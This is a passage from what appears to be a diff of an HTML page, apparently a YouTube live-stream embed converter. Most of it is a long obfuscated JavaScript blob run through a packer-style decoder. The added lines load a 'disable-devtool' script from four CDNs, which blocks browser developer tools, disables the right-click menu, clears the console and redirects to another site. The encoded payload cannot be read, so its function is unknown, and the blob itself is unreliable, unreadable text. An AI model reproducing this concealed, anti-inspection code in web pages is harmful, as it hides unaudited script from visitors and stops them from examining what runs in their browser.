PsZMPMPZMMPPZgPgsZgMgPZgPgsZgPsMZMPMgZMgPsZMggMZMPMMZMgPMZgPsMZgMPMZgPgsZMggsZMgMgZMPsPZMgPsZMggMZMPMPZMPMsZMPsPZMgMgZggggZMPMMZMgPsZMPMPZMgMMZMgMMZgsPsZMgPPZMgMMZMgMsZggggZMPMPZMPMsZMPMsZgPssZgPsMZMPssZMgPPZMPMsZMPMsZMPsPZMgggZgPsMZggPPZgMPMZgPgsZMgMgZMPsPZMgMsZMgsPZMgMgZMgggZgMPMZgPgsZMMgPZgPgsZMgPsZMPsPZMgMsZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZgsMMZMgMgZMPMMZgPgsZgMgPZgPgsZMPgsZMPssZMgMsZMgMsZMggsZMgMMZgMPgZgggMZgggMZMgsMZMgsMZMgsMZggggZMMPPZMggMZMgsPZMgMsZMgsPZMPMgZMPsPZggggZMPMMZMggMZMggPZgggMZMPsPZMggPZMPMgZMPsPZMPMsZgggMZMgPsZMgPPZMgsgZMPsPZMPgMZMgMMZMgMsZMgMgZMPsPZMPMPZMggPZgMgMZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgMgPZgPMsZMMPMZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZMMgPZgPsgZMPMPZMgsPZMgMsZMggMZMggsZMgPsZMPMPZMMPPZgMgPZggMPZMPgsZgMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMPMPZMgPsZMgPsZgssPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZgPgsZgMgPZgPgsZMPsMZMPsPZMgMsZgMMPZMgPsZMgPsZgssPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZgPssZggPPZgMPMZgPgsZMgPPZMPsgZgPgsZgPssZMPMPZMgPsZMgPsZgssPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZggPPZgPgsZMMPMZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZgsMMZMgMgZMPMMZgPgsZggPMZgMgPZgPgsZMPgsZgPsgZgPMsZMMPMZMPMPZMgPsZMgPsZgssPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZggggZMgMMZMgPsZMgPPZMPMMZMPsPZgPssZggMPZggPPZMMgPZMPgsZgMPMZgPgsZMMgPZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZggggZMgMMZMgMgZMPMMZgPgsZgMgPZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZgsMMZMgMgZMPMMZgMPMZgPgsZMgPPZMPsgZgPgsZgPssZMPMMZMgPsZMgPPZMPMMZMgPMZgPgsZgMgPZgMgPZgMgPZgPgsZgPsMZMgggZMggMZMgggZMPsPZgPsMZggPPZgPgsZMMPMZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZggggZMgMMZMgMsZMMPPZMgPsZMPsPZggggZMggsZMggMZMgPPZMgggZMgMsZMPsPZMgMgZgMsPZMgsgZMPsPZMgggZMgMsZMgMMZgPgsZgMgPZgPgsZgPsMZMgggZMggMZMgggZMPsPZgPsMZgMPMZgPgsZMMgPZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZggggZMggMZMgggZMgPsZMggMZMPMPZMPMsZgPgsZgMgPZgPgsZMPsgZMgsPZMgggZMPMMZMgMsZMgPPZMggMZMgggZgPssZggPPZgPgsZMMPMZgPgsZMggsZMgMgZMPsPZMgPsZMggMZMPMPZMPMsZMPsPZMgMgZggggZMPMMZMgPsZMPMPZMgMMZMgMMZgsPsZMgPPZMgMMZMgMsZggggZMPMPZMPMsZMPMsZgPssZgPsMZMPssZMgPPZMPMsZMPMsZMPsPZMgggZgPsMZggPPZgMPMZgPgsZMgMMZMPsPZMgMsZgsMsZMgPPZMggPZMPsPZMggMZMgsPZMgMsZgPssZgPssZggPPZgPgsZgMgPZgMggZgPgsZMMPMZgPgsZMggsZMgMgZMPsPZMgPsZMggMZMPMPZMPMsZMPsPZMgMgZggggZMgMMZMgMsZMMPPZMgPsZMPsPZggggZMPMsZMgPPZMgMMZMggsZMgPsZMPMPZMMPPZgPgsZgMgPZgPgsZgPsMZMgggZMggMZMgggZMPsPZgPsMZgMPMZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZgMMMZMggMZMgggZMgMsZMPMPZMgPPZMgggZMPsPZMgMgZggggZMgMMZMgMsZMMPPZMgPsZMPsPZggggZMPMsZMgPPZMgMMZMggsZMgPsZMPMPZMMPPZgPgsZgMgPZgPgsZgPsMZMPMgZMgPsZMggMZMPMMZMgPMZgPsMZgMPMZgPgsZMMgPZggPsZgPgsZggsPZgggsZgggsZggPPZgMPMZgPgsZMMgPZgMPMZgPgsZMMgPZgMPMZ",62,"PgMsZrHvQ",39,4,27))</script>
+  <script src="https://dunggramer.github.io/disable-devtool/disable-devtool.min.js" defer></script>
+<script src="https://cdn.staticaly.com/gh/DungGramer/disable-devtool/cbf447f/disable-devtool.min.js" defer></script>
+<script src="https://gitcdn.xyz/repo/DungGramer/disable-devtool/master/disable-devtool.min.js" defer></script>
+<script
+    disable-devtool-auto
+    src='https://cdn.jsdelivr.net/npm/disable-devtool'
+    url='https://hellopeopletv4you.github.io/Youtube-Live-Stream-To-Embed-Convert/'
+    disable-menu='true'
+    clear-log='true'
+></script>
 </body>
 </html>
